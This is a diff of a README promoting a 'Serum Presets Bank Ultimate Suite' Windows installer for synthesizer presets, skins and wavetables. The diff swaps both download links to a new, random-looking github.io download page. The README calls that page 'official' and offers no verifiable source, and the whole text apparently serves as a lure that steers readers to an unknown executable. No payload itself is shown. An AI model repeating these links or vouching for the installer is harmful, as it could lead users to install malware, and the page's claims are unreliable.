@@ -2,7 +2,7 @@
 
 Welcome to the Serum Presets Bank Ultimate Suite, the definitive companion for Serum users seeking to dramatically expand their sonic palette in 2026. This package is designed to streamline your workflow, offering a massive collection of high-quality presets, professionally designed skins, and a comprehensive wavetable library, all delivered through an intuitive Windows desktop application. Whether you're a seasoned producer or just starting out, this suite provides the tools to unlock Serum's full potential and inspire your next musical masterpiece.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -42,4 +42,4 @@ A: Absolutely. All sounds, skins, and wavetables included in this package are ro
 
 You can acquire the latest version of the installer and all additional documentation from our official repository page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
